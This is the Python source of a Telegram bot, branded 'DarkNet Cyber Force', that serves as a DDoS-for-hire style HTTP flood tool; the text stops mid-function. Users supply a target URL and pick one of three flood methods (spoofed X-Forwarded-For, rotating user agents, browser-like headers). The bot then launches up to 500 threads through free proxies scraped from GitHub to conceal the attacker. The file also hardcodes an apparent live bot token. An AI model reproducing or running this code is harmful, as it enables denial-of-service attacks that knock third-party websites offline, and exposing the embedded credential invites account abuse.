import sys
if sys.version_info >= (3, 12):
    import telegram
    # Patch for Python 3.12+
    if not hasattr(telegram.ext.Updater, '_Updater__polling_cleanup_cb'):
        telegram.ext.Updater._Updater__polling_cleanup_cb = None
import logging
import threading
import time
import random
import re
import requests
import warnings
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, ContextTypes, MessageHandler, filters
from telegram.warnings import PTBUserWarning
from datetime import datetime, timedelta
from collections import defaultdict
import sys

# ==================== WARNING IGNORE ====================
warnings.filterwarnings("ignore", message=r".*CallbackQueryHandler", category=PTBUserWarning)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8793812387:AAGsDlj1NezNO0TFx3Sr3qVrUJJsGag8thQ"
ADMIN_ID = 7860525462
ADMIN_USERNAME = "@Mahmud_X_Darkprism"
CHANNEL_URL = "https://t.me/DarkNet_Cyber_Force_BD"
CHANNEL_USERNAME = "DarkNet_Cyber_Force_BD"
CHANNEL_ID = -1003716078064
ADMIN_COMMAND = "mahmud101"
BOT_VERSION = "3.0"

# ==================== LOGGING ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.WARNING)

# ==================== CONVERSATION STATES ====================
(URL_INPUT, METHOD_SELECT, THREADS_INPUT, PROXY_SELECT, VERIFY_WAIT, 
 BROADCAST_TYPE, BROADCAST_TEXT, BROADCAST_PHOTO, BROADCAST_VIDEO, 
 TARGET_USER, CUSTOM_MSG) = range(11)

# ==================== GLOBAL VARIABLES ====================
active_attacks = {}
attack_stats = {}
proxy_pools = {}
user_stats = {}
verified_users = {}
attack_history = defaultdict(list)
user_cooldown = {}

method_names = {
    1: "🔥 X-Forwarded-For Spoof",
    2: "⚡ User-Agent Rotator",
    3: "💀 Advanced Browser"
}

method_emojis = {1: "🔥", 2: "⚡", 3: "💀"}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

# ==================== DECORATORS ====================
def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id != ADMIN_ID:
            if update.callback_query:
                await update.callback_query.answer("⛔ Access Denied!", show_alert=True)
            else:
                await update.message.reply_text("⛔ Access Denied! You are not authorized.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def track_user(user_id, username, first_name):
    if user_id not in user_stats:
        user_stats[user_id] = {
            'username': username or 'N/A',
            'first_name': first_name or 'N/A',
            'last_used': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_attacks': 0,
            'join_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_requests': 0,
            'verified': False
        }
    else:
        user_stats[user_id]['last_used'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        user_stats[user_id]['username'] = username or user_stats[user_id]['username']

# ==================== SUBSCRIPTION CHECK ====================
async def is_user_subscribed(bot, user_id):
    try:
        try:
            member = await bot.get_chat_member(CHANNEL_ID, user_id)
            if member.status in ['member', 'administrator', 'creator']:
                return True
        except:
            pass
        
        try:
            member = await bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
            if member.status in ['member', 'administrator', 'creator']:
                return True
        except:
            pass
            
    except Exception as e:
        logger.error(f"Subscription check error for {user_id}: {e}")
    
    return False

def require_subscription(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        
        if user_id in user_cooldown:
            remaining = (user_cooldown[user_id] - datetime.now()).total_seconds()
            if remaining > 0:
                if update.callback_query:
                    await update.callback_query.answer(f"⏳ Please wait {int(remaining)}s", show_alert=True)
                else:
                    await update.message.reply_text(f"⏳ Please wait {int(remaining)} seconds before using again.")
                return
        
        is_member = await is_user_subscribed(context.bot, user_id)
        
        if not is_member:
            if user_id in verified_users:
                del verified_users[user_id]
            if user_id in user_stats:
                user_stats[user_id]['verified'] = False
            
            keyboard = [
                [InlineKeyboardButton("📢 Join Our Channel", url=CHANNEL_URL)],
                [InlineKeyboardButton("✅ I've Joined ✅", callback_data='verify_join')],
                [InlineKeyboardButton("🔄 Check Again", callback_data='check_again')]
            ]
            
            msg = (
                "🚫 ACCESS DENIED\n"
                "━━━━━━━━━━━━━━━━━━━\n\n"
                "⚠️ You must be a member of our channel\n"
                "to use this bot!\n\n"
                f"📢 Channel: @{CHANNEL_USERNAME}\n"
                f"🔗 Link: {CHANNEL_URL}\n\n"
                "✅ After joining, click the button below.\n"
                "🔄 Already joined? Click 'Check Again'.\n\n"
                "⏳ Verification lasts 24 hours."
            )
            
            if update.callback_query:
                await update.callback_query.edit_message_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            elif update.message:
                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            return VERIFY_WAIT
        
        verified_users[user_id] = datetime.now()
        if user_id in user_stats:
            user_stats[user_id]['verified'] = True
        
        user_cooldown[user_id] = datetime.now() + timedelta(seconds=2)
        return await func(update, context, *args, **kwargs)
    return wrapper

# ==================== PROXY FUNCTIONS ====================
def fetch_proxies():
    sources = [
        'https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt',
        'https://raw.githubusercontent.com/Skillter/ProxyGather/refs/heads/master/proxies/working-proxies-http.txt',
    ]
    proxies = set()
    for src in sources:
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            r = requests.get(src, timeout=10, headers=headers)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if re.match(r'^(\d{1,3}\.){3}\d{1,3}:\d+$', line):
                        proxies.add(line)
        except Exception as e:
            logger.warning(f"Proxy fetch error from {src}: {e}")
            continue
    return list(proxies)

def validate_proxies(proxy_list):
    working = []
    if not proxy_list:
        return working
    for proxy in proxy_list[:15]:
        try:
            test = requests.get('http://httpbin.org/ip', 
                proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}, timeout=3)
            if test.status_code == 200:
                working.append(proxy)
        except:
            continue
    return working if working else proxy_list[:10]

# ==================== ATTACK METHODS ====================
def method1_attack(url, stop_event, proxies, stats, thread_id):
    while not stop_event.is_set():
        try:
            proxy = {'http': f'http://{random.choice(proxies)}'} if proxies else None
            headers = {
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            resp = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            stats['total'] += 1
            if resp.status_code in [200, 301, 302, 403, 500]:
                stats['success'] += 1
            else:
                stats['failed'] += 1
            stats['logs'].append(f"T{thread_id} | {resp.status_code}")
            if len(stats['logs']) > 15:
                stats['logs'].pop(0)
        except requests.exceptions.Timeout:
            stats['timeout'] += 1
        except:
            stats['error'] += 1
        time.sleep(0.05)

def method2_attack(url, stop_event, proxies, stats, thread_id):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            proxy = {'http': f'http://{random.choice(proxies)}'} if proxies else None
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'DNT': '1',
                'Upgrade-Insecure-Requests': '1'
            }
            resp = session.get(url, headers=headers, proxies=proxy, timeout=5)
            stats['total'] += 1
            if resp.status_code in [200, 301, 302, 403, 500]:
                stats['success'] += 1
            else:
                stats['failed'] += 1
            stats['logs'].append(f"T{thread_id} | {resp.status_code}")
            if len(stats['logs']) > 15:
                stats['logs'].pop(0)
        except requests.exceptions.Timeout:
            stats['timeout'] += 1
        except:
            stats['error'] += 1
        time.sleep(0.05)

def method3_attack(url, stop_event, proxies, stats, thread_id):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            proxy = {'http': f'http://{random.choice(proxies)}'} if proxies else None
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            }
            start = time.time()
            resp = session.get(url, headers=headers, proxies=proxy, timeout=5)
            elapsed = time.time() - start
            stats['total'] += 1
            if resp.status_code in [200, 301, 302, 403, 500]:
                stats['success'] += 1
            else:
                stats['failed'] += 1
            stats['avg_time'] = (stats['avg_time'] * (stats['total'] - 1) + elapsed) / stats['total']
            stats['logs'].append(f"T{thread_id} | {resp.status_code} | {elapsed:.2f}s")
            if len(stats['logs']) > 15:
                stats['logs'].pop(0)
        except requests.exceptions.Timeout:
            stats['timeout'] += 1
        except:
            stats['error'] += 1
        time.sleep(0.05)

# ==================== ATTACK MANAGER ====================
def launch_attack(chat_id, url, method_num, threads, use_proxy):
    if chat_id in active_attacks and active_attacks[chat_id]:
        return False
    
    stop_event = threading.Event()
    active_attacks[chat_id] = stop_event
    
    proxies = []
    if use_proxy:
        if chat_id in proxy_pools and proxy_pools[chat_id]:
            proxies = proxy_pools[chat_id]
        else:
            raw = fetch_proxies()
            proxies = validate_proxies(raw) if raw else []
            proxy_pools[chat_id] = proxies
    
    stats = {
        'total': 0, 'success': 0, 'failed': 0, 'timeout': 0, 'error': 0,
        'avg_time': 0, 'logs': [], 'start_time': datetime.now(),
        'method': method_num, 'threads': threads, 'url': url
    }
    attack_stats[chat_id] = stats
    
    attack_func = {1: method1_attack, 2: method2_attack, 3: method3_attack}[method_num]
    
    for i in range(threads):
        t = threading.Thread(target=attack_func, args=(url, stop_event, proxies, stats, i+1))
        t.daemon = True
        t.start()
    
    return True

def stop_attack(chat_id):
    if chat_id in active_attacks and active_attacks[chat_id]:
        active_attacks[chat_id].set()
        active_attacks[chat_id] = None
        return True
    return False

# ==================== ATTACK ANIMATION ====================
async def show_attack_status(chat_id, context):
    if chat_id not in active_attacks or not active_attacks[chat_id]:
        return
    
    stats = attack_stats.get(chat_id, {})
    if not stats:
        return
    
    duration = (datetime.now() - stats.get('start_time', datetime.now())).seconds
    
    anim_emojis = ['⚡', '🔥', '💥', '🚀', '💀', '🎯']
    anim_idx = int(duration / 2) % len(anim_emojis)
    
    total = stats.get('total', 1)
    success = stats.get('success', 0)
    progress = int((success / max(total, 1)) * 20)
    bar = '█' * progress + '░' * (20 - progress)
    
    threads_active = stats.get('threads', 0)
    
    msg = (
        f"{anim_emojis[anim_idx]} ATTACK IN PROGRESS {anim_emojis[anim_idx]}\n"
        f"╔══════════════════════════════════════╗\n"
        f"║ ⏱️ Duration    : {duration}s\n"
        f"║ 📥 Total       : {stats.get('total', 0):,}\n"
        f"║ ✅ Success     : {stats.get('success', 0):,}\n"
        f"║ ❌ Failed      : {stats.get('failed', 0):,}\n"
        f"║ 📊 Success Rate: {round((stats.get('success', 0)/max(stats.get('total', 1), 1))*100, 1)}%\n"
        f"║ 📈 [{bar}] {progress*5}%\n"
        f"║ ⚡ Avg Resp    : {stats.get('avg_time', 0):.2f}s\n"
        f"║ 🧵 Threads     : {threads_active}\n"
        f"║ 🌐 Proxies     : {'🟢 ACTIVE' if chat_id in proxy_pools and proxy_pools[chat_id] else '🔴 OFF'}\n"
        f"╚══════════════════════════════════════╝\n"
        f"📋 Latest: {stats.get('logs', [''])[-1] if stats.get('logs') else 'Starting...'}\n"
        f"💡 /stop to terminate"
    )
    
    try:
        if 'status_msg_id' in context.user_data:
            await context.bot.edit_message_text(
                msg,
                chat_id=chat_id,
                message_id=context.user_data['status_msg_id']
            )
        else:
            sent = await context.bot.send_message(chat_id=chat_id, text=msg)
            context.user_data['status_msg_id'] = sent.message_id
    except:
        pass

# ==================== MAIN MENU ====================
async def show_main_menu(update, context, name):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
    
    if user_id in user_cooldown:
        del user_cooldown[user_id]
    
    stats = user_stats.get(user_id, {})
    total_attacks = stats.get('total_attacks', 0)
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data='start_attack')],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data='stop')],
        [InlineKeyboardButton("📊 Live Status", callback_data='status')],
        [InlineKeyboardButton("🔄 Reload Proxies", callback_data='reload_proxies')],
        [InlineKeyboardButton("📊 My Stats", callback_data='my_stats')],
        [InlineKeyboardButton("❓ Help", callback_data='help')],
        [InlineKeyboardButton("👑 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME.replace('@', '')}")]
    ]
    
    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data='admin_panel')])
    
    msg = (
        f"💀 DARKNET CYBER FORCE\n"
        f"╔════════════════════════════╗\n"
        f"║ 👤 {name}\n"
        f"║ 🎯 Total Attacks: {total_attacks}\n"
        f"║ ✅ Verified: {'✅' if user_id in verified_users else '❌'}\n"
        f"║ 🔥 Active: {'🟢' if user_id in active_attacks and active_attacks[user_id] else '🔴'}\n"
        f"╚════════════════════════════╝\n\n"
        f"⚡ 3 Attack Methods Available\n"
        f"🔄 Auto Proxy Rotation\n"
        f"📊 Real-time Statistics\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📌 Choose an option below:"
    )
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            msg,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            msg,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# ==================== START COMMAND ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    if user_id in user_cooldown:
        del user_cooldown[user_id]
    
    track_user(user_id, username, first_name)
    
    is_member = await is_user_subscribed(context.bot, user_id)
    
    if is_member:
        verified_users[user_id] = datetime.now()
        if user_id in user_stats:
            user_stats[user_id]['verified'] = True
        await show_main_menu(update, context, first_name)
    else:
        keyboard = [
            [InlineKeyboardButton("📢 Join Our Channel", url=CHANNEL_URL)],
            [InlineKeyboardButton("✅ I've Joined ✅", callback_data='verify_join')],
            [InlineKeyboardButton("🔄 Check Again", callback_data='check_again')]
        ]
        await update.message.reply_text(
            f"🔐 VERIFICATION REQUIRED\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚠️ You must join our channel to use this bot!\n\n"
            f"📢 Channel: @{CHANNEL_USERNAME}\n"
            f"🔗 Link: {CHANNEL_URL}\n\n"
            f"✅ After joining, click '✅ I've Joined ✅'\n"
            f"🔄 Already joined? Click 'Check Again'.\n\n"
            f"⏳ Verification lasts 24 hours.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return VERIFY_WAIT

# ==================== VERIFICATION CALLBACKS ====================
async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    track_user(user_id, username, first_name)
    
    is_member = await is_user_subscribed(context.bot, user_id)
    
    if is_member:
        verified_users[user_id] = datetime.now()
        if user_id in user_stats:
            user_stats[user_id]['verified'] = True
        await show_main_menu(update, context, first_name)
    else:
        keyboard = [
            [InlineKeyboardButton("📢 Join Our Channel", url=CHANNEL_URL)],
            [InlineKeyboardButton("✅ I've Joined ✅", callback_data='verify_join')],
            [InlineKeyboardButton("🔄 Check Again", callback_data='check_again')]
        ]
        await query.edit_message_text(
            "❌ VERIFICATION FAILED\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ You haven't joined the channel yet!\n\n"
            "📌 Please follow these steps:\n"
            f"1️⃣ Join: @{CHANNEL_USERNAME}\n"
            f"2️⃣ Click: '✅ I've Joined ✅'\n\n"
            "🔄 If you already joined, click 'Check Again'.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def check_again_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    is_member = await is_user_subscribed(context.bot, user_id)
    
    if is_member:
        verified_users[user_id] = datetime.now()
        if user_id in user_stats:
            user_stats[user_id]['verified'] = True
        await show_main_menu(update, context, first_name)
    else:
        keyboard = [
            [InlineKeyboardButton("📢 Join Our Channel", url=CHANNEL_URL)],
            [InlineKeyboardButton("✅ I've Joined ✅", callback_data='verify_join')],
            [InlineKeyboardButton("🔄 Check Again", callback_data='check_again')]
        ]
        await query.edit_message_text(
            "❌ STILL NOT VERIFIED\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ We couldn't verify your membership.\n\n"
            "📌 Please check:\n"
            "1️⃣ Are you a member of the channel?\n"
            f"   → @{CHANNEL_USERNAME}\n"
            "2️⃣ Click '🔄 Check Again' after joining.\n\n"
            "❓ If the problem persists, contact admin.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# ==================== BUTTON CALLBACK ====================
@require_subscription
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if data == 'start_attack':
        await query.edit_message_text(
            "🌐 STEP 1/4 – TARGET URL\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "Send target URL with http:// or https://\n\n"
            "📌 Example: https://example.com\n\n"
            "💡 Type /cancel to go back"
        )
        return URL_INPUT
    
    elif data == 'stop':
        if stop_attack(chat_id):
            stats = attack_stats.get(chat_id, {})
            duration = (datetime.now() - stats.get('start_time', datetime.now())).seconds
            msg = (
                f"🛑 ATTACK STOPPED\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"⏱️ Duration: {duration}s\n"
                f"📥 Total  : {stats.get('total',0):,}\n"
                f"✅ Success: {stats.get('success',0):,}\n"
                f"❌ Failed : {stats.get('failed',0):,}\n"
                f"📊 Rate   : {round((stats.get('success',0)/max(stats.get('total',1),1))*100,1)}%"
            )
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            msg = "⚠️ No active attack to stop."
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        return ConversationHandler.END
    
    elif data == 'status':
        if chat_id not in active_attacks or not active_attacks[chat_id]:
            msg = "📭 No attack running."
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await show_attack_status(chat_id, context)
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
            await context.bot.send_message(chat_id=chat_id, text="🔙 Click below to go back:", reply_markup=InlineKeyboardMarkup(keyboard))
        return ConversationHandler.END
    
    elif data == 'reload_proxies':
        await query.edit_message_text("🔄 Fetching fresh proxies from GitHub...")
        raw = fetch_proxies()
        if raw:
            working = validate_proxies(raw)
            proxy_pools[chat_id] = working
            msg = (
                f"✅ PROXY UPDATED\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 Loaded: {len(working)} working proxies\n"
                f"📊 Source: GitHub"
            )
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            msg = "❌ Failed to fetch proxies. Try again later."
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        return ConversationHandler.END
    
    elif data == 'my_stats':
        stats = user_stats.get(user_id, {})
        total = stats.get('total_attacks', 0)
        join_date = stats.get('join_date', 'N/A')
        last_used = stats.get('last_used', 'N/A')
        
        history = attack_history.get(user_id, [])[-5:]
        history_text = "\n".join([f"• {h['url'][:30]}... ({h['status']})" for h in history]) if history else "No history"
        
        msg = (
            f"📊 MY STATISTICS\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Name: {stats.get('first_name', 'N/A')}\n"
            f"🆔 ID: {user_id}\n"
            f"🎯 Total Attacks: {total}\n"
            f"✅ Verified: {'✅' if user_id in verified_users else '❌'}\n"
            f"📅 Joined: {join_date}\n"
            f"⏱️ Last Used: {last_used}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📋 Recent Attacks:\n{history_text}"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        return ConversationHandler.END
    
    elif data == 'help':
        msg = (
            "📖 HELP GUIDE\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "⚔️ ATTACK METHODS:\n"
            "🔥 Method 1 – X-Forwarded-For Spoofing\n"
            "⚡ Method 2 – User-Agent Rotation\n"
            "💀 Method 3 – Advanced Browser Headers\n\n"
            "🔄 PROXY ROTATION:\n"
            "Auto-fetches HTTP proxies from GitHub\n\n"
            "📌 COMMANDS:\n"
            "/start – Main menu\n"
            "/stop – Stop attack\n"
            "/status – Live stats\n"
            "/reload_proxies – Refresh proxies\n"
            "/my_stats – Your statistics\n\n"
            "⚠️ Use responsibly!\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👑 For support, use 'Contact Admin' button."
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        return ConversationHandler.END
    
    elif data == 'admin_panel':
        if user_id == ADMIN_ID:
            await admin_panel(update, context)
        else:
            await query.answer("⛔ Access Denied!", show_alert=True)
        return ConversationHandler.END
    
    elif data == 'back_to_main':
        first_name = update.effective_user.first_name
        await show_main_menu(update, context, first_name)
        return ConversationHandler.END
    
    return ConversationHandler.END

# ==================== CONVERSATION HANDLERS ====================
@require_subscription
async def receive_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith(('http://', 'https://')):
        keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data='back_to_main')]]
        await update.message.reply_text(
            "❌ Invalid URL. Please enter with http:// or https://",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return URL_INPUT
    
    context.user_data['target_url'] = url
    
    keyboard = [
        [InlineKeyboardButton("🔥 Method 1 - X-Forwarded-For", callback_data='method1')],
        [InlineKeyboardButton("⚡ Method 2 - User-Agent", callback_data='method2')],
        [InlineKeyboardButton("💀 Method 3 - Advanced", callback_data='method3')],
        [InlineKeyboardButton("🔙 Cancel", callback_data='back_to_main')]
    ]
    
    await update.message.reply_text(
        "⚙️ STEP 2/4 – CHOOSE METHOD\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Select your attack method:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return METHOD_SELECT

@require_subscription
async def method_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'back_to_main':
        first_name = update.effective_user.first_name
        await show_main_menu(update, context, first_name)
        return ConversationHandler.END
    
    method_map = {'method1': 1, 'method2': 2, 'method3': 3}
    if data not in method_map:
        await query.edit_message_text("❌ Invalid selection.")
        return METHOD_SELECT
    
    context.user_data['method_num'] = method_map[data]
    method_name = method_names[method_map[data]]
    
    keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data='back_to_main')]]
    
    await query.edit_message_text(
        f"✅ Selected: {method_name}\n\n"
        "🧵 STEP 3/4 – THREADS\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Send number of threads (1 – 500):\n"
        "💡 Recommended: 50-200 for best results",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return THREADS_INPUT

@require_subscription
async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        threads = int(update.message.text.strip())
        if threads < 1 or threads > 500:
            raise ValueError
    except:
        keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data='back_to_main')]]
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Please enter a number between 1 and 500.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return THREADS_INPUT
    
    context.user_data['threads'] = threads
    
    keyboard = [
        [InlineKeyboardButton("✅ Yes, Use Proxies", callback_data='proxy_yes')],
        [InlineKeyboardButton("❌ No, Direct Attack", callback_data='proxy_no')],
        [InlineKeyboardButton("🔙 Cancel", callback_data='back_to_main')]
    ]
    
    await update.message.reply_text(
        "🌍 STEP 4/4 – PROXY ROTATION\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Use proxy rotation for better results?\n\n"
        "✅ Proxies hide your IP\n"
        "❌ Direct is faster but detectable",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PROXY_SELECT

@require_subscription
async def proxy_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'back_to_main':
        first_name = update.effective_user.first_name
        await show_main_menu(update, context, first_name)
        return ConversationHandler.END
    
    use_proxy = (data == 'proxy_yes')
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    url = context.user_data.get('target_url', '')
    method_num = context.user_data.get('method_num', 1)
    threads = context.user_data.get('threads', 50)
    
    if user_id in user_stats:
        user_stats[user_id]['total_attacks'] = user_stats[user_id].get('total_attacks', 0) + 1
    
    if launch_attack(chat_id, url, method_num, threads, use_proxy):
        method_name = method_names.get(method_num, "Unknown")
        method_emoji = method_emojis.get(method_num, "🔥")
        
        attack_history[user_id].append({
            'url': url,
            'method': method_name,
            'threads': threads,
            'status': 'Started',
            'time': datetime.now().strftime('%H:%M:%S')
        })
        if len(attack_history[user_id]) > 10:
            attack_history[user_id].pop(0)
        
        msg = (
            f"{method_emoji} ATTACK LAUNCHED {method_emoji}\n"
            f"╔════════════════════════════╗\n"
            f"║ 🎯 Target  : {url[:50]}...\n"
            f"║ ⚙️ Method  : {method_name}\n"
            f"║ 🧵 Threads : {threads}\n"
            f"║ 🌐 Proxy   : {'🟢 ACTIVE' if use_proxy else '🔴 OFF'}\n"
            f"║ 📊 Status  : 🔥 RUNNING\n"
            f"╚════════════════════════════╝\n\n"
            f"📊 Use /status to monitor\n"
            f"🛑 Use /stop to terminate"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        msg = (
            "⚠️ Another attack is already running!\n"
            "Use /stop first then try again."
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    
    return ConversationHandler.END

@require_subscription
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    first_name = update.effective_user.first_name
    await show_main_menu(update, context, first_name)
    return ConversationHandler.END

# ==================== COMMAND HANDLERS ====================
@require_subscription
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if stop_attack(chat_id):
        stats = attack_stats.get(chat_id, {})
        duration = (datetime.now() - stats.get('start_time', datetime.now())).seconds
        msg = (
            f"🛑 ATTACK STOPPED\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ Duration: {duration}s\n"
            f"📥 Total  : {stats.get('total',0):,}\n"
            f"✅ Success: {stats.get('success',0):,}\n"
            f"❌ Failed : {stats.get('failed',0):,}"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        msg = "⚠️ No active attack to stop."
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

@require_subscription
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in active_attacks or not active_attacks[chat_id]:
        msg = "📭 No attack running."
